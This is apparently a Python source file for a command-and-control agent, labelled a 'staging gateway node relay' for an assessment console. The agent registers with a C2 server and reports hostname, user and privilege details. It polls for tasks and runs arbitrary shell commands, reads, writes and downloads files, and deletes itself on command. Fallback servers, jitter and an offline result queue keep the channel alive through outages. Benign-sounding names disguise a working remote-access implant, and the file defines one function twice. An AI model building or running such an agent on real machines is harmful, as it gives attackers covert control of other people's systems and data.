#!/usr/bin/env python3
"""
Staging Gateway Node Relay

Lightweight Python agent that registers with the staging gateway and keeps
a heartbeat alive so the assessment console can attribute and monitor the
node (presence, hostname/OS/user inventory, offline result queue).

Build variants (chosen at build time by the gateway):
  - full variant: additionally polls and executes console-dispatched tasks
  - beacon variant (_BEACON_ONLY): heartbeat/inventory only — no command
    execution, no task polling side effects; used for pure presence-detection
    drills.

Usage:
    python c2_agent.py --server http://<c2_host>:<port> [--interval 5]

Config is embedded at build time by c2_agent_builder.py.
"""

import json
import os
import platform
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from urllib.request import Request, urlopen

_BEACON_ONLY = False  # build-time: True = heartbeat/inventory only

_CONFIG = {
    "c2_server": "http://127.0.0.1:4877",
    "fallback_servers": [],
    "agent_id": "",
    "poll_interval": 5,
    "max_poll_interval": 300,
    "jitter": 0.2,
    "registration_token": "",
}

# Offline result queue: results that cannot be delivered (server down) are
# staged on disk and flushed on the next successful round trip — a stable
# channel keeps its intel across outages instead of dropping it.
_QUEUE_PATH = Path(__file__).with_suffix(".queue")


def _queue_result(result):
    try:
        lines = []
        if _QUEUE_PATH.exists():
            lines = _QUEUE_PATH.read_text().splitlines()[-199:]
        lines.append(json.dumps(result))
        _QUEUE_PATH.write_text("\n".join(lines))
    except Exception:
        pass


def _drain_queue(server_url):
    try:
        if not _QUEUE_PATH.exists():
            return
        kept = []
        for line in _QUEUE_PATH.read_text().splitlines()[:200]:
            try:
                item = json.loads(line)
                _post_json(f"{server_url}/c2/tasks/{item['task_id']}/result", item)
            except Exception:
                kept.append(line)
        if kept:
            _QUEUE_PATH.write_text("\n".join(kept))
        else:
            _QUEUE_PATH.unlink()
    except Exception:
        pass


def _load_config():
    config_path = Path(__file__).with_suffix(".conf")
    if config_path.exists():
        try:
            with open(config_path) as f:
                _CONFIG.update(json.load(f))
        except Exception:
            pass
    for i, arg in enumerate(sys.argv):
        if arg == "--server" and i + 1 < len(sys.argv):
            _CONFIG["c2_server"] = sys.argv[i + 1]
        if arg == "--interval" and i + 1 < len(sys.argv):
            _CONFIG["poll_interval"] = int(sys.argv[i + 1])


def _post_json(url, data, timeout=10):
    headers = {"Content-Type": "application/json", "User-Agent": "staging-node-relay/1.0"}
    if _CONFIG.get("registration_token"):
        headers["X-Client-Token"] = _CONFIG["registration_token"]
    req = Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers,
    )
    with urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def _get_json(url, timeout=10):
    req = Request(url, headers={"User-Agent": "staging-node-relay/1.0"})
    with urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def _collect_system_info():
    info = {
        "hostname": platform.node(),
        "os_name": platform.system(),
        "os_version": platform.release(),
        "username": os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
        "arch": platform.machine(),
    }
    try:
        info["privileges"] = "root" if os.geteuid() == 0 else "user"
    except Exception:
        info["privileges"] = "unknown"
    return info


def _execute_command(cmd, timeout=60):
    try:
        proc = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=tempfile.gettempdir(),
        )
        return {
            "stdout": proc.stdout[:65536],
            "stderr": proc.stderr[:65536],
            "returncode": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Command timed out", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}


def _read_file(path):
    try:
        p = Path(path)
        if not p.exists():
            return {"error": "file not found", "content": ""}
        if p.stat().st_size > 10 * 1024 * 1024:
            return {"error": "file too large (>10MB)", "content": ""}
        content = p.read_text(errors="replace")
        return {"content": content[:1048576], "size": p.stat().st_size, "path": str(p)}
    except Exception as e:
        return {"error": str(e), "content": ""}


def _write_file(path, content):
    try:
        p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
        return {"success": True, "path": str(p), "size": p.stat().st_size}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _execute_task(task):
    task_id = task["id"]
    task_type = task.get("task_type", "cmd")
    cmd = task.get("command", "")
    args = task.get("arguments_json", {}) or {}

    if task_type == "cmd":
        result = _execute_command(cmd)
        return {
            "task_id": task_id,
            "status": "completed",
            "output": f"STDOUT:\n{result['stdout']}\nSTDERR:\n{result['stderr']}\nRC: {result['returncode']}",
            "result": result,
        }

    if task_type == "read_file":
        path = args.get("path", cmd)
        result = _read_file(path)
        return {
            "task_id": task_id,
            "status": "completed",
            "output": result.get("content", result.get("error", "")),
            "result": result,
        }

    if task_type == "write_file":
        path = args.get("path", cmd)
        content = args.get("content", "")
        result = _write_file(path, content)
        return {
            "task_id": task_id,
            "status": "completed" if result.get("success") else "failed",
            "output": f"Written: {result.get('path', '')} ({result.get('size', 0)} bytes)" if result.get("success") else result.get("error", ""),
            "result": result,
        }

    if task_type == "download":
        url = args.get("url", cmd)
        dest = args.get("dest", "/tmp/downloaded_file")
        try:
            req = Request(url, headers={"User-Agent": "staging-node-relay/1.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            Path(dest).parent.mkdir(parents=True, exist_ok=True)
            Path(dest).write_bytes(data)
            return {
                "task_id": task_id,
                "status": "completed",
                "output": f"Downloaded {len(data)} bytes to {dest}",
                "result": {"success": True, "path": dest, "size": len(data)},
            }
        except Exception as e:
            return {
                "task_id": task_id,
                "status": "failed",
                "output": str(e),
                "result": {"success": False, "error": str(e)},
            }

    if task_type == "uninstall":
        try:
            agent_file = Path(__file__)
            conf_file = agent_file.with_suffix(".conf")
            if conf_file.exists():
                conf_file.unlink()
            agent_file.unlink(missing_ok=True)
        except Exception:
            pass
        return {
            "task_id": task_id,
            "status": "completed",
            "output": "Uninstalled successfully",
            "result": {"uninstalled": True},
        }

    return {
        "task_id": task_id,
        "status": "failed",
        "output": f"Unknown task type: {task_type}",
        "result": {},
    }


def _send_results(server_url, results):
    for r in results:
        # agent_id must ride on every result post — the server's result route
        # verifies task ownership against it (403 otherwise).
        r["agent_id"] = _CONFIG["agent_id"]
        try:
            _post_json(f"{server_url}/c2/tasks/{r['task_id']}/result", r)
        except Exception:
            _queue_result(r)


def _drain_queue(server_url):
    try:
        if not _QUEUE_PATH.exists():
            return
        kept = []
        for line in _QUEUE_PATH.read_text().splitlines()[:200]:
            try:
                item = json.loads(line)
                item["agent_id"] = _CONFIG["agent_id"]
                _post_json(f"{server_url}/c2/tasks/{item['task_id']}/result", item)
            except Exception:
                kept.append(line)
        if kept:
            _QUEUE_PATH.write_text("\n".join(kept))
        else:
            _QUEUE_PATH.unlink()
    except Exception:
        pass


def _heartbeat(server_url, sys_info, results):
    if _BEACON_ONLY:
        # node-agent contract on the staging origin: one round trip carries
        # the node id, pending task acknowledgements and the inventory block
        payload = {
            "agent_id": _CONFIG["agent_id"],
            "results": results,
            "sys": {
                "hostname": sys_info.get("hostname", ""),
                "os_name": sys_info.get("os_name", ""),
                "os_version": sys_info.get("os_version", ""),
                "username": sys_info.get("username", ""),
                "privileges": sys_info.get("privileges", ""),
                "arch": sys_info.get("arch", ""),
            },
        }
        url = f"{server_url}/portal/api/client-heartbeat"
    else:
        payload = {
            **sys_info,
            "agent_id": _CONFIG["agent_id"],
            "registration_token": _CONFIG.get("registration_token", ""),
            "results": results,
        }
        url = f"{server_url}/c2/heartbeat"
    try:
        resp = _post_json(url, payload)
        if resp.get("agent_id"):
            _CONFIG["agent_id"] = resp["agent_id"]
            _save_config()
        if resp.get("poll_interval"):
            _CONFIG["poll_interval"] = resp["poll_interval"]
        return resp
    except Exception:
        return {"status": "error"}


def _save_config():
    try:
        config_path = Path(__file__).with_suffix(".conf")
        config_path.write_text(json.dumps(_CONFIG))
    except Exception:
        pass


def main():
    _load_config()
    servers = [_CONFIG["c2_server"].rstrip("/")]
    servers += [s.rstrip("/") for s in _CONFIG.get("fallback_servers", []) if s]
    server_idx = 0
    failures = 0
    sys_info = _collect_system_info()

    resp = _heartbeat(servers[server_idx], sys_info, [])
    _save_config()

    backoff = _CONFIG["poll_interval"]

    pending: list[dict] = []
    while True:
        server_url = servers[server_idx % len(servers)]
        if _BEACON_ONLY:
            # node-agent loop: one portal heartbeat per tick — the gateway
            # response carries the node checklist inline; no separate polling,
            # no command execution. Dispatched items are acknowledged as
            # skipped on the next tick (receipt, not obedience).
            sys_info = _collect_system_info()
            resp = _heartbeat(server_url, sys_info, pending)
            pending = []
            task = resp.get("next_task") if isinstance(resp, dict) else None
            if task:
                pending.append({
                    "task_id": task.get("task_id") or task.get("id") or 0,
                    "status": "skipped",
                    "output": "node agent: command execution not supported",
                })
            jitter = 1.0 + _CONFIG["jitter"] * (hash(time.time()) % 100) / 100.0
            time.sleep(backoff * jitter)
            continue
        # Prefer the task delivered inline with the last heartbeat (merged
        # roundtrip); fall back to a dedicated poll when none was attached.
        task = resp.get("next_task") if isinstance(resp, dict) else None
        if not task:
            try:
                result = _post_json(
                    f"{server_url}/c2/tasks/poll",
                    {"agent_id": _CONFIG["agent_id"]},
                )
            except Exception:
                failures += 1
                if failures >= 3 and len(servers) > 1:
                    server_idx += 1  # fail over to the next configured channel
                    failures = 0
                time.sleep(backoff)
                backoff = min(backoff * 2, _CONFIG["max_poll_interval"])
                continue
            task = result.get("task") if result.get("status") == "ok" else None

        failures = 0
        backoff = _CONFIG["poll_interval"]
        _drain_queue(server_url)

        if task and _BEACON_ONLY:
            pending.append({
                "task_id": task.get("task_id") or task.get("id") or 0,
                "status": "skipped",
                "output": "node agent: command execution not supported",
            })
            task = None

        if task:
            task_result = _execute_task(task)
            _send_results(server_url, [task_result])

        sys_info = _collect_system_info()
        resp = _heartbeat(server_url, sys_info, [])

        if task and task.get("task_type") == "uninstall":
            return

        jitter = 1.0 + _CONFIG["jitter"] * (hash(time.time()) % 100) / 100.0
        time.sleep(backoff * jitter)


if __name__ == "__main__":
    main()
